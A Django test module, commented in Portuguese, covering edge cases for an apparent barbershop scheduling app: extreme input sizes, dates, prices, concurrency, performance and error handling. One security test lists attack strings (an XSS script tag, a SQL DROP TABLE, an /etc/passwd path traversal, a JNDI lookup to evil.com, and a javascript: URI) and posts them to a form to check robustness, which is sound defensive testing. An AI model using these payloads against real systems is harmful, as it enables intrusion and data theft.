"""
Testes de Edge Cases - Cenários Extremos e Casos Especiais

Este módulo contém testes para cenários extremos, casos especiais e situações
que podem ocorrer em produção mas são difíceis de reproduzir em testes normais.
"""

from datetime import date
from datetime import time as dt_time
from datetime import timedelta
from decimal import Decimal
from unittest.mock import patch

from django.contrib.auth.models import User
from django.test import TestCase, TransactionTestCase
from django.urls import reverse

import pytest

from .forms import AgendamentoForm, ClienteForm, ServicoForm
from .models import Agendamento, Cliente, Servico


@pytest.mark.edge_cases
class EdgeCasesDataTest(TestCase):
    """Testa cenários extremos com dados"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    def test_cliente_nome_muito_longo(self):
        """Testa criação de cliente com nome muito longo"""
        nome_longo = "A" * 1000  # Nome com 1000 caracteres

        form_data = {
            "nome": nome_longo,
            "telefone": "11999999999",
            "endereco": "Rua Teste, 123",
        }

        form = ClienteForm(data=form_data)
        if form.is_valid():
            cliente = form.save()
            self.assertEqual(cliente.nome, nome_longo)
        else:
            # Se o formulário não aceita, verificar se há validação
            self.assertIn("nome", form.errors)

    def test_cliente_telefone_formato_especial(self):
        """Testa telefones com formatos especiais"""
        telefones_especiais = [
            "+55 11 99999-9999",
            "(11) 99999-9999",
            "11 99999 9999",
            "+5511999999999",
            "11999999999",
            "11-99999-9999",
        ]

        for telefone in telefones_especiais:
            with self.subTest(telefone=telefone):
                cliente = Cliente.objects.create(
                    nome=f"Cliente {telefone}", telefone=telefone
                )
                self.assertEqual(cliente.telefone, telefone)

    def test_servico_preco_zero(self):
        """Testa criação de serviço com preço zero"""
        servico = Servico.objects.create(
            nome="Serviço Gratuito", duracao=30, preco=Decimal("0.00")
        )
        self.assertEqual(servico.preco, Decimal("0.00"))

    def test_servico_preco_muito_alto(self):
        """Testa criação de serviço com preço muito alto"""
        preco_alto = Decimal("999999.99")
        servico = Servico.objects.create(
            nome="Serviço Premium", duracao=120, preco=preco_alto
        )
        self.assertEqual(servico.preco, preco_alto)

    def test_agendamento_data_passado_distante(self):
        """Testa agendamento com data muito no passado"""
        data_passado = date(1900, 1, 1)

        cliente = Cliente.objects.create(nome="Cliente Teste")
        servico = Servico.objects.create(
            nome="Serviço Teste", duracao=30, preco=Decimal("50.00")
        )

        agendamento = Agendamento.objects.create(
            cliente=cliente, servico=servico, data=data_passado, hora=dt_time(10, 0)
        )
        self.assertEqual(agendamento.data, data_passado)

    def test_agendamento_data_futuro_distante(self):
        """Testa agendamento com data muito no futuro"""
        data_futuro = date(2100, 12, 31)

        cliente = Cliente.objects.create(nome="Cliente Teste")
        servico = Servico.objects.create(
            nome="Serviço Teste", duracao=30, preco=Decimal("50.00")
        )

        agendamento = Agendamento.objects.create(
            cliente=cliente, servico=servico, data=data_futuro, hora=dt_time(10, 0)
        )
        self.assertEqual(agendamento.data, data_futuro)

    def test_agendamento_hora_limite(self):
        """Testa agendamentos com horários limite"""
        cliente = Cliente.objects.create(nome="Cliente Teste")
        servico = Servico.objects.create(
            nome="Serviço Teste", duracao=30, preco=Decimal("50.00")
        )

        # Hora mínima
        agendamento_min = Agendamento.objects.create(
            cliente=cliente, servico=servico, data=date.today(), hora=dt_time(0, 0)
        )
        self.assertEqual(agendamento_min.hora, dt_time(0, 0))

        # Hora máxima
        agendamento_max = Agendamento.objects.create(
            cliente=cliente, servico=servico, data=date.today(), hora=dt_time(23, 59)
        )
        self.assertEqual(agendamento_max.hora, dt_time(23, 59))


@pytest.mark.edge_cases
class EdgeCasesConcurrencyTest(TransactionTestCase):
    """Testa cenários de concorrência extremos"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    def test_criacao_concorrente_clientes_mesmo_nome(self):
        """Testa criação concorrente de clientes com mesmo nome"""
        nome_duplicado = "Cliente Duplicado"

        def criar_cliente():
            try:
                cliente = Cliente.objects.create(
                    nome=nome_duplicado, telefone="11999999999"
                )
                return cliente
            except Exception as e:
                return e

        # Simular criação concorrente
        resultados = []
        for _ in range(5):
            resultado = criar_cliente()
            resultados.append(resultado)

        # Pelo menos um deve ter sucesso
        sucessos = [r for r in resultados if isinstance(r, Cliente)]
        self.assertGreaterEqual(len(sucessos), 1)

    def test_atualizacao_concorrente_agendamento(self):
        """Testa atualização concorrente do mesmo agendamento"""
        cliente = Cliente.objects.create(nome="Cliente Teste")
        servico = Servico.objects.create(
            nome="Serviço Teste", duracao=30, preco=Decimal("50.00")
        )

        agendamento = Agendamento.objects.create(
            cliente=cliente,
            servico=servico,
            data=date.today(),
            hora=dt_time(10, 0),
            status="agendado",
        )

        def atualizar_status(novo_status):
            try:
                agendamento.status = novo_status
                agendamento.save()
                return True
            except Exception:
                return False

        # Simular atualizações concorrentes
        resultados = []
        for status in ["confirmado", "em_andamento", "concluido"]:
            resultado = atualizar_status(status)
            resultados.append(resultado)

        # Pelo menos uma atualização deve ter sucesso
        self.assertGreaterEqual(sum(resultados), 1)


@pytest.mark.edge_cases
class EdgeCasesValidationTest(TestCase):
    """Testa validações em cenários extremos"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    def test_formulario_cliente_dados_vazios(self):
        """Testa formulário de cliente com todos os campos vazios"""
        form_data = {"nome": "", "telefone": "", "endereco": ""}

        form = ClienteForm(data=form_data)
        # Deve ser inválido se nome é obrigatório
        self.assertFalse(form.is_valid())
        self.assertIn("nome", form.errors)

    def test_formulario_agendamento_data_invalida(self):
        """Testa formulário de agendamento com data inválida"""
        cliente = Cliente.objects.create(nome="Cliente Teste")
        servico = Servico.objects.create(
            nome="Serviço Teste", duracao=30, preco=Decimal("50.00")
        )

        form_data = {
            "cliente": cliente.pk,
            "servico": servico.pk,
            "data": "data-invalida",
            "hora": "10:00",
        }

        form = AgendamentoForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn("data", form.errors)

    def test_formulario_servico_preco_negativo(self):
        """Testa formulário de serviço com preço negativo"""
        form_data = {"nome": "Serviço Teste", "duracao": 30, "preco": "-10.00"}

        form = ServicoForm(data=form_data)
        # Django pode aceitar preços negativos dependendo da configuração
        if form.is_valid():
            servico = form.save()
            self.assertEqual(servico.preco, Decimal("-10.00"))
        else:
            self.assertIn("preco", form.errors)


@pytest.mark.edge_cases
class EdgeCasesAPIResponseTest(TestCase):
    """Testa respostas da API em cenários extremos"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    def test_view_com_dados_inexistentes(self):
        """Testa views com IDs inexistentes"""
        # Tentar acessar cliente inexistente
        response = self.client.get(reverse("editar_cliente", args=[99999]))
        self.assertEqual(response.status_code, 404)

        # Tentar deletar agendamento inexistente
        response = self.client.post(reverse("deletar_agendamento", args=[99999]))
        self.assertEqual(response.status_code, 404)

    def test_view_com_parametros_invalidos(self):
        """Testa views com parâmetros inválidos"""
        # Tentar acessar painel com data inválida
        response = self.client.get("/painel/", {"data": "data-invalida"})
        # Deve redirecionar ou mostrar erro, mas não quebrar
        self.assertIn(response.status_code, [200, 302, 400])

    def test_view_com_dados_maliciosos(self):
        """Testa views com dados potencialmente maliciosos"""
        dados_maliciosos = [
            '<script>alert("xss")</script>',
            "DROP TABLE clientes;",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "javascript:alert(1)",
        ]

        for dado in dados_maliciosos:
            with self.subTest(dado=dado):
                # Tentar criar cliente com nome malicioso
                response = self.client.post(
                    reverse("criar_cliente"),
                    {
                        "nome": dado,
                        "telefone": "11999999999",
                        "csrfmiddlewaretoken": "test-token",
                    },
                )

                # Deve processar sem quebrar (pode aceitar ou rejeitar)
                self.assertIn(response.status_code, [200, 302, 400])


@pytest.mark.edge_cases
class EdgeCasesPerformanceTest(TestCase):
    """Testa performance em cenários extremos"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    def test_lista_clientes_com_muitos_dados(self):
        """Testa lista de clientes com muitos registros"""
        # Criar muitos clientes
        clientes = []
        for i in range(1000):
            cliente = Cliente.objects.create(
                nome=f"Cliente {i}", telefone=f"1199999{i:04d}"
            )
            clientes.append(cliente)

        # Testar performance da view
        import time

        start_time = time.time()

        response = self.client.get(reverse("lista_clientes"))

        end_time = time.time()
        response_time = end_time - start_time

        self.assertEqual(response.status_code, 200)
        # Deve responder em menos de 5 segundos
        self.assertLess(response_time, 5.0)

    def test_financeiro_com_muitos_agendamentos(self):
        """Testa view financeiro com muitos agendamentos"""
        cliente = Cliente.objects.create(nome="Cliente Teste")
        servico = Servico.objects.create(
            nome="Serviço Teste", duracao=30, preco=Decimal("50.00")
        )

        # Criar muitos agendamentos
        for i in range(500):
            Agendamento.objects.create(
                cliente=cliente,
                servico=servico,
                data=date.today() + timedelta(days=i),
                hora=dt_time(10, 0),
                status="concluido",
                status_pagamento="pago",
            )

        # Testar performance
        import time

        start_time = time.time()

        response = self.client.get(reverse("financeiro"))

        end_time = time.time()
        response_time = end_time - start_time

        self.assertEqual(response.status_code, 200)
        # Deve responder em menos de 3 segundos
        self.assertLess(response_time, 3.0)


@pytest.mark.edge_cases
class EdgeCasesErrorHandlingTest(TestCase):
    """Testa tratamento de erros em cenários extremos"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    @patch("agendamentos.views.Agendamento.objects.filter")
    def test_view_com_erro_database(self, mock_filter):
        """Testa view quando há erro de banco de dados"""
        # Simular erro de banco de dados
        mock_filter.side_effect = Exception("Database connection error")

        try:
            response = self.client.get(reverse("painel_barbeiro"))
            # Se não houve exceção, verificar se foi tratada
            self.assertIn(response.status_code, [500, 200])
        except Exception:
            # Se houve exceção, isso é esperado para este teste
            pass

    def test_view_com_erro_import(self):
        """Testa view quando há erro de importação"""
        # Simular erro de importação (não é fácil de testar diretamente)
        # Mas podemos testar se a aplicação continua funcionando
        response = self.client.get(reverse("painel_barbeiro"))
        self.assertEqual(response.status_code, 200)

    def test_view_com_erro_memory(self):
        """Testa view quando há erro de memória"""
        # Criar muitos objetos para testar limite de memória
        clientes = []
        for i in range(10000):  # Número alto para testar limite
            try:
                cliente = Cliente.objects.create(
                    nome=f"Cliente {i}", telefone=f"1199999{i:04d}"
                )
                clientes.append(cliente)
            except MemoryError:
                # Se houver erro de memória, deve ser tratado
                break

        # A aplicação deve continuar funcionando
        response = self.client.get(reverse("lista_clientes"))
        self.assertEqual(response.status_code, 200)


@pytest.mark.edge_cases
class EdgeCasesIntegrationTest(TestCase):
    """Testa integração em cenários extremos"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    def test_fluxo_completo_com_dados_extremos(self):
        """Testa fluxo completo com dados extremos"""
        # 1. Criar cliente com dados extremos
        cliente_data = {
            "nome": "A" * 100,  # Nome muito longo
            "telefone": "+55 11 99999-9999",
            "endereco": "Rua " + "A" * 200,
        }

        response = self.client.post(reverse("criar_cliente"), cliente_data)
        self.assertIn(response.status_code, [200, 302])

        # 2. Criar serviço com preço extremo
        servico_data = {
            "nome": "Serviço " + "B" * 50,
            "duracao": 999,
            "preco": "999999.99",
        }

        response = self.client.post(reverse("criar_servico"), servico_data)
        self.assertIn(response.status_code, [200, 302])

        # 3. Criar agendamento com data extrema
        cliente = Cliente.objects.first()
        servico = Servico.objects.first()

        if cliente and servico:
            agendamento_data = {
                "cliente": cliente.pk,
                "servico": servico.pk,
                "data": "2100-12-31",  # Data muito no futuro
                "hora": "23:59",
            }

            response = self.client.post(reverse("agendar"), agendamento_data)
            self.assertIn(response.status_code, [200, 302])

    def test_operacoes_em_lote(self):
        """Testa operações em lote"""
        # Criar múltiplos clientes em sequência
        for i in range(100):
            cliente_data = {"nome": f"Cliente Lote {i}", "telefone": f"1199999{i:04d}"}

            response = self.client.post(reverse("criar_cliente"), cliente_data)
            self.assertIn(response.status_code, [200, 302])

        # Verificar se todos foram criados
        total_clientes = Cliente.objects.count()
        self.assertGreaterEqual(total_clientes, 100)

    def test_operacoes_concorrentes_simuladas(self):
        """Testa operações concorrentes simuladas"""
        cliente = Cliente.objects.create(nome="Cliente Teste")
        servico = Servico.objects.create(
            nome="Serviço Teste", duracao=30, preco=Decimal("50.00")
        )

        # Simular operações concorrentes
        operacoes = []

        # Criar agendamentos
        for i in range(10):
            agendamento_data = {
                "cliente": cliente.pk,
                "servico": servico.pk,
                "data": date.today().isoformat(),
                "hora": f"{10 + i}:00",
            }

            response = self.client.post(reverse("agendar"), agendamento_data)
            operacoes.append(response.status_code)

        # Verificar se todas as operações foram processadas
        sucessos = [code for code in operacoes if code in [200, 302]]
        self.assertGreaterEqual(len(sucessos), 5)  # Pelo menos metade deve ter sucesso


@pytest.mark.edge_cases
class EdgeCasesSecurityTest(TestCase):
    """Testa segurança em cenários extremos"""

    def setUp(self):
        self.user = User.objects.create_user(
            username="testuser", password="testpass123"
        )
        self.client.login(username="testuser", password="testpass123")

    def test_input_com_tamanho_extremo(self):
        """Testa input com tamanho extremo"""
        # Tentar enviar dados com tamanho extremo
        dados_extremos = {
            "nome": "A" * 10000,  # 10KB de dados
            "telefone": "B" * 1000,
            "endereco": "C" * 5000,
        }

        response = self.client.post(reverse("criar_cliente"), dados_extremos)

        # Deve processar sem quebrar
        self.assertIn(response.status_code, [200, 302, 400])

    def test_request_com_headers_extremos(self):
        """Testa request com headers extremos"""
        # Adicionar headers com valores extremos
        headers = {
            "HTTP_USER_AGENT": "A" * 1000,
            "HTTP_REFERER": "B" * 1000,
            "HTTP_X_FORWARDED_FOR": "C" * 1000,
        }

        response = self.client.get(reverse("painel_barbeiro"), **headers)

        # Deve processar sem quebrar
        self.assertEqual(response.status_code, 200)

    def test_session_com_dados_extremos(self):
        """Testa session com dados extremos"""
        # Tentar armazenar dados extremos na session
        session = self.client.session
        session["dados_extremos"] = "A" * 10000
        session.save()

        response = self.client.get(reverse("painel_barbeiro"))

        # Deve processar sem quebrar
        self.assertEqual(response.status_code, 200)
